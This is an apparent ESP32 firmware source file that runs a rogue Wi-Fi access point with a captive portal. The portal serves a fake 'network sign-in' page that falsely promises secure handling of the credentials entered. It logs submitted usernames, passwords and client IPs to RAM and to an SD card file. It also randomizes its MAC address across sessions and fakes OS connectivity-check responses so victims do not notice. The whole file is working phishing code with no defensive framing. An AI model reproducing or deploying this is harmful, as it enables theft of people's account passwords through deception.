// See captive.h. Single-file impl using DNSServer + WebServer (sync). The
// HTTP and DNS objects are heap-allocated on start() so a clean stop() can
// fully release the port and socket; otherwise re-opening the screen would
// trip "port already in use" on the second visit.
#include "captive.h"
#include "../features/sd_config.h"
#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <string.h>

namespace {
  bool         s_running  = false;
  bool         s_released = false;  // true after any /submit — OS probes return success
  DNSServer*   s_dns = nullptr;
  WebServer*   s_http = nullptr;

  // Capture ring buffer (last 10).
  const uint8_t CAP_MAX = 10;
  captive::Hit  s_hits[CAP_MAX];
  uint8_t       s_hitCount = 0;

  const char PORTAL_HTML[] PROGMEM = R"(<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0a66c2">
<title>Wi-Fi sign in</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;padding:0;min-height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  background:#f3f4f6;color:#111827;line-height:1.45;-webkit-font-smoothing:antialiased}
.bar{background:#fff;border-bottom:1px solid #e5e7eb;padding:14px 18px;display:flex;align-items:center;gap:10px}
.bar .dot{width:10px;height:10px;border-radius:50%;background:#0a66c2;box-shadow:0 0 0 4px rgba(10,102,194,.15)}
.bar h1{font-size:15px;margin:0;font-weight:600;letter-spacing:.2px}
.wrap{max-width:420px;margin:0 auto;padding:28px 20px 48px}
.card{background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:24px;
  box-shadow:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(17,24,39,.06)}
.brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
.brand svg{width:36px;height:36px;flex:0 0 36px}
.brand .t1{font-size:17px;font-weight:700;color:#111827;line-height:1.1}
.brand .t2{font-size:12px;color:#6b7280;margin-top:2px}
h2{font-size:20px;margin:6px 0 4px;font-weight:600}
.lead{color:#4b5563;font-size:14px;margin:0 0 18px}
.terms{background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;padding:10px 12px;
  font-size:12px;color:#4b5563;margin-bottom:18px}
label{display:block;font-size:12px;color:#374151;font-weight:600;margin:12px 0 6px;
  text-transform:uppercase;letter-spacing:.5px}
input{display:block;width:100%;padding:11px 12px;font-size:15px;
  border:1px solid #d1d5db;border-radius:8px;background:#fff;color:#111827;
  transition:border-color .15s,box-shadow .15s}
input:focus{outline:none;border-color:#0a66c2;box-shadow:0 0 0 3px rgba(10,102,194,.18)}
.row{display:flex;align-items:center;gap:8px;margin:14px 0 18px;font-size:13px;color:#4b5563}
.row input{width:auto;margin:0}
button{width:100%;padding:12px;background:#0a66c2;color:#fff;border:0;border-radius:8px;
  font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
button:hover{background:#0853a0}
button:active{background:#074581}
.foot{text-align:center;color:#9ca3af;font-size:11px;margin-top:18px}
.foot a{color:#6b7280;text-decoration:none}
.lock{display:inline-block;vertical-align:-2px;margin-right:4px}
</style></head>
<body>
<div class="bar">
  <span class="dot"></span>
  <h1>Wi-Fi network sign-in required</h1>
</div>
<div class="wrap">
  <div class="card">
    <div class="brand">
      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <circle cx="16" cy="16" r="16" fill="#0a66c2"/>
        <path d="M8 17.5c4.4-4.4 11.6-4.4 16 0M11 20.5c2.8-2.8 7.2-2.8 10 0M14.5 23.5a2 2 0 1 1 3 0 2 2 0 0 1-3 0"
          stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round"/>
      </svg>
      <div>
        <div class="t1">Network Authentication</div>
        <div class="t2">Secure connection portal</div>
      </div>
    </div>
    <h2>Sign in to continue</h2>
    <p class="lead">To access the internet on this network, please verify your account.</p>
    <div class="terms">
      <svg class="lock" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#4b5563" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      Your credentials are transmitted over a secure session and used only for network access.
    </div>
    <form method="POST" action="/submit" autocomplete="on">
      <label for="u">Email or username</label>
      <input id="u" name="u" type="text" autocomplete="username" autocapitalize="off"
        autocorrect="off" spellcheck="false" required>
      <label for="p">Password</label>
      <input id="p" name="p" type="password" autocomplete="current-password" required>
      <div class="row">
        <input type="checkbox" id="r" name="r" checked>
        <label for="r" style="margin:0;text-transform:none;letter-spacing:0;font-weight:400;color:#4b5563">Remember this device on this network</label>
      </div>
      <button type="submit">Connect to network</button>
    </form>
  </div>
  <div class="foot">By signing in you agree to the <a href="#">Terms of Service</a> &amp; <a href="#">Acceptable Use Policy</a>.</div>
</div>
</body></html>)";

  void recordHit(const String& u, const String& p) {
    if (s_hitCount < CAP_MAX) {
      auto& h = s_hits[s_hitCount++];
      h.ms = millis();
      strncpy(h.user, u.c_str(), sizeof(h.user) - 1); h.user[sizeof(h.user) - 1] = 0;
      strncpy(h.pass, p.c_str(), sizeof(h.pass) - 1); h.pass[sizeof(h.pass) - 1] = 0;
    } else {
      // Shift down, drop oldest.
      for (uint8_t i = 1; i < CAP_MAX; ++i) s_hits[i - 1] = s_hits[i];
      auto& h = s_hits[CAP_MAX - 1];
      h.ms = millis();
      strncpy(h.user, u.c_str(), sizeof(h.user) - 1); h.user[sizeof(h.user) - 1] = 0;
      strncpy(h.pass, p.c_str(), sizeof(h.pass) - 1); h.pass[sizeof(h.pass) - 1] = 0;
    }
  }

  void handlePortal() {
    s_http->send_P(200, "text/html", PORTAL_HTML);
  }
  void handleSubmit() {
    String u = s_http->arg("u");
    String p = s_http->arg("p");
    recordHit(u, p);
    // Persist to SD so captures survive a screen close / power cycle. CSV-ish
    // tab-separated line; one append per submission. Silent no-op if SD isn't
    // available (MSC mounted, no card, etc.) — recordHit() already kept it
    // in the RAM ring buffer.
    String line;
    line.reserve(160);
    line  = String(millis());
    line += '\t';
    line += WiFi.softAPSSID();
    line += '\t';
    line += s_http->client().remoteIP().toString();
    line += '\t';
    line += u;
    line += '\t';
    line += p;
    sd_config::appendLine("/captive/hits.tsv", line);
    // Mark the session as "released" so subsequent OS connectivity probes
    // get success responses — that's what actually causes the CNA popup to
    // dismiss itself. The body here is just a fallback page; the real
    // close-trigger is the next probe Apple/Google fires.
    s_released = true;
    s_http->send(200, "text/html",
      "<!doctype html><html><head>"
      "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
      "<title>Connected</title>"
      "<style>body{font-family:-apple-system,sans-serif;text-align:center;"
      "padding:60px 20px;color:#374151;background:#f3f4f6}"
      "h2{font-weight:600;font-size:18px;margin:0 0 6px}"
      "p{font-size:14px;color:#6b7280;margin:0}</style></head><body>"
      "<h2>You're connected</h2><p>You may close this window.</p>"
      "<script>setTimeout(function(){window.close();},200);</script>"
      "</body></html>");
  }
  // OS connectivity probes. Before the user submits, we redirect them to /
  // (forcing the CNA popup to show our portal). After /submit, we answer
  // with the OS-specific success response so the popup self-dismisses.
  bool isAppleProbe(const String& uri) {
    return uri.indexOf("hotspot-detect")    >= 0 ||
           uri.indexOf("library/test/success") >= 0;
  }
  bool isAndroidProbe(const String& uri) {
    return uri.indexOf("generate_204")      >= 0 ||
           uri.indexOf("gen_204")           >= 0;
  }
  bool isWindowsProbe(const String& uri) {
    return uri.indexOf("ncsi.txt")          >= 0 ||
           uri.indexOf("connecttest")       >= 0;
  }
  void handleNotFound() {
    String uri = s_http->uri();
    if (s_released) {
      if (isAndroidProbe(uri)) {
        s_http->send(204, "text/plain", "");
        return;
      }
      if (isAppleProbe(uri)) {
        s_http->send(200, "text/html",
          "<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
          "<BODY>Success</BODY></HTML>");
        return;
      }
      if (isWindowsProbe(uri)) {
        s_http->send(200, "text/plain", "Microsoft NCSI");
        return;
      }
    }
    // Default pre-submit behaviour: redirect every unknown request to the
    // portal so OS captive checks land on our form.
    s_http->sendHeader("Location", "/", true);
    s_http->send(302, "text/plain", "");
  }
}

namespace captive {

bool start(const char* ssid) {
  if (s_running) return false;
  s_released = false;
  s_hitCount = 0;
  for (uint8_t i = 0; i < CAP_MAX; ++i) s_hits[i] = Hit{};

  // See files_http::start for the rationale: full radio reset before AP, then
  // set_mac (mode is set but radio not started), then softAP, then config.
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(50);
  WiFi.mode(WIFI_AP);
  // Random locally-administered MAC per start so the AP doesn't show up as
  // the same BSSID across sessions (helps avoid client-side "remembered
  // network" entries lining up across captures). Bits in octet 0: clear
  // multicast (bit 0 = 0), set locally-administered (bit 1 = 1).
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)esp_random();
  mac[0] = (mac[0] & 0xFC) | 0x02;
  esp_wifi_set_mac(WIFI_IF_AP, mac);
  if (!WiFi.softAP(ssid ? ssid : "smartwatch", nullptr)) return false;
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                    IPAddress(192, 168, 4, 1),
                    IPAddress(255, 255, 255, 0));

  s_dns = new DNSServer();
  s_dns->setErrorReplyCode(DNSReplyCode::NoError);
  s_dns->start(53, "*", WiFi.softAPIP());

  s_http = new WebServer(80);
  s_http->on("/", handlePortal);
  s_http->on("/submit", HTTP_POST, handleSubmit);
  s_http->onNotFound(handleNotFound);
  s_http->begin();

  s_running = true;
  return true;
}

void stop() {
  if (!s_running) return;
  if (s_http) { s_http->stop(); delete s_http; s_http = nullptr; }
  if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
  WiFi.softAPdisconnect(true);
  s_running  = false;
  s_released = false;
  s_hitCount = 0;
  for (uint8_t i = 0; i < CAP_MAX; ++i) s_hits[i] = Hit{};
}

void tick() {
  if (!s_running) return;
  if (s_dns)  s_dns->processNextRequest();
  if (s_http) s_http->handleClient();
}

uint8_t snapshot(Hit* out, uint8_t max) {
  uint8_t n = s_hitCount < max ? s_hitCount : max;
  for (uint8_t i = 0; i < n; ++i) out[i] = s_hits[i];
  return n;
}

uint8_t clientCount() {
  return s_running ? WiFi.softAPgetStationNum() : 0;
}

bool running() { return s_running; }

} // namespace captive
